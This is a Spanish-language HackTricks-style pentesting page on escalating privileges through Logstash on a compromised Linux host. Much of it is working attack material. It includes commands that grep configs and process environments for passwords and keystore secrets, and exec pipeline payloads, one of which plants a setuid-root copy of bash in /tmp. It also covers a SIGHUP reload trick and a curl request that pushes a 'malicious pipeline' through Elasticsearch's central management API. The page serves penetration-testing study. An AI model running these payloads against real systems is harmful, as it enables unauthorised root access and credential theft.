# Escalada de privilegios en Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se utiliza para **recopilar, transformar y distribuir logs** mediante un sistema conocido como **pipelines**. Estos pipelines están compuestos por etapas de **input**, **filter** y **output**. Un aspecto interesante surge cuando Logstash opera en una máquina comprometida.

### Configuración del pipeline

Los pipelines se configuran en el archivo **/etc/logstash/pipelines.yml**, que indica las ubicaciones de las configuraciones de los pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este archivo revela dónde se encuentran los archivos **.conf** que contienen las configuraciones de los pipelines. Al emplear un **Elasticsearch output module**, es común que los **pipelines** incluyan **credenciales de Elasticsearch**, que a menudo poseen privilegios amplios debido a que Logstash necesita escribir datos en Elasticsearch. Los comodines en las rutas de configuración permiten que Logstash ejecute todos los pipelines que coincidan en el directorio designado.

Si Logstash se inicia con `-f <directory>` en lugar de `pipelines.yml`, **todos los archivos dentro de ese directorio se concatenan en orden lexicográfico y se analizan como una única configuración**. Esto crea 2 implicaciones ofensivas:

- Un archivo agregado, como `000-input.conf` o `zzz-output.conf`, puede modificar la forma en que se ensambla el pipeline final
- Un archivo malformado puede impedir la carga del pipeline completo, por lo que debes validar cuidadosamente los payloads antes de depender de la recarga automática

### Enumeración rápida en un host comprometido

En un equipo donde Logstash está instalado, inspecciona rápidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Comprueba también si la API de monitorización local es accesible. De forma predeterminada, se enlaza a **127.0.0.1:9600**, lo que normalmente es suficiente después de obtener acceso al host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Esto normalmente te proporciona los ID de los pipelines, detalles del runtime y confirmación de que tu pipeline modificado se ha cargado.

Las credenciales recuperadas de Logstash suelen permitir acceder a **Elasticsearch**, así que consulta [esta otra página sobre Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Escalada de privilegios mediante pipelines escribibles

Para intentar una escalada de privilegios, identifica primero el usuario con el que se está ejecutando el servicio Logstash, normalmente el usuario **logstash**. Asegúrate de cumplir **uno** de estos criterios:

- Tener **acceso de escritura** a un archivo **.conf** de un pipeline **o**
- El archivo **/etc/logstash/pipelines.yml** utiliza un comodín y puedes escribir en la carpeta de destino

Además, se debe cumplir **una** de estas condiciones:

- Poder reiniciar el servicio Logstash **o**
- El archivo **/etc/logstash/logstash.yml** tiene configurado `config.reload.automatic: true`

Dado que hay un comodín en la configuración, crear un archivo que coincida con este comodín permite ejecutar comandos. Por ejemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aquí, **interval** determina la frecuencia de ejecución en segundos. En el ejemplo proporcionado, el comando **whoami** se ejecuta cada 120 segundos y su salida se dirige a **/tmp/output.log**.

Con **config.reload.automatic: true** en **/etc/logstash/logstash.yml**, Logstash detectará y aplicará automáticamente las configuraciones de pipeline nuevas o modificadas sin necesidad de reiniciarse.<sup>[[1]](#references)</sup> Si no hay ningún comodín, aún se pueden realizar modificaciones en las configuraciones existentes, pero se recomienda tener precaución para evitar interrupciones.

### Payloads de Pipeline más fiables

El plugin de entrada `exec` sigue funcionando en las versiones actuales y requiere un `interval` o un `schedule`. Se ejecuta haciendo **fork** de la JVM de Logstash, por lo que, si la memoria es limitada, tu payload puede fallar con `ENOMEM` en lugar de ejecutarse silenciosamente.

Un payload de privilege-escalation más práctico suele ser uno que deje un artefacto persistente:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Si no tienes permisos para reiniciar, pero puedes enviar señales al proceso, Logstash también admite una recarga activada por **SIGHUP** en sistemas similares a Unix:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Ten en cuenta que no todos los plugins permiten la recarga. Por ejemplo, la entrada **stdin** impide la recarga automática, así que no des por sentado que `config.reload.automatic` siempre detectará tus cambios.<sup>[[1]](#references)</sup>

### Robar secretos de Logstash

Antes de centrarte únicamente en la ejecución de código, recopila los datos a los que Logstash ya tiene acceso:

- Las credenciales en texto plano suelen estar hardcodeadas dentro de las salidas `elasticsearch {}`, `http_poller`, las entradas JDBC o la configuración relacionada con la nube
- La configuración segura puede encontrarse en **`/etc/logstash/logstash.keystore`** o en otro directorio `path.settings`
- La contraseña del keystore suele proporcionarse mediante **`LOGSTASH_KEYSTORE_PASS`**, y las instalaciones basadas en paquetes normalmente la obtienen de **`/etc/sysconfig/logstash`**
- La expansión de variables de entorno mediante `${VAR}` se resuelve durante el inicio de Logstash, por lo que conviene inspeccionar el entorno del servicio

Comprobaciones útiles:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
También vale la pena comprobar esto porque **CVE-2023-46672** mostró que Logstash podía registrar información sensible en los logs bajo circunstancias específicas. Por lo tanto, en un host de post-exploitation, los logs antiguos de Logstash y las entradas de `journald` podrían revelar credenciales incluso si la configuración actual hace referencia al keystore en lugar de almacenar los secretos directamente.<sup>[[3]](#references)</sup>

### Abuso de la gestión centralizada de pipelines

En algunos entornos, el host **no** depende en absoluto de archivos `.conf` locales. Si está configurado **`xpack.management.enabled: true`**, Logstash puede obtener pipelines gestionados centralmente desde Elasticsearch/Kibana y, después de habilitar este modo, las configuraciones de pipelines locales dejan de ser la fuente de verdad.<sup>[[2]](#references)</sup>

Esto implica una vía de ataque diferente:

1. Recuperar las credenciales de Elastic de la configuración local de Logstash, el keystore o los logs
2. Verificar si la cuenta tiene el privilegio de clúster **`manage_logstash_pipelines`**
3. Crear o reemplazar un pipeline gestionado centralmente para que el host de Logstash ejecute tu payload en su siguiente intervalo de consulta

La API de Elasticsearch utilizada para esta función es:<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Esto es especialmente útil cuando los archivos locales son de solo lectura, pero Logstash ya está registrado para obtener pipelines de forma remota.

## Referencias

- [1] [Elastic Docs: Recarga del archivo de configuración](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Configuración de la gestión centralizada de pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Actualización de seguridad de Logstash 8.11.1 (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
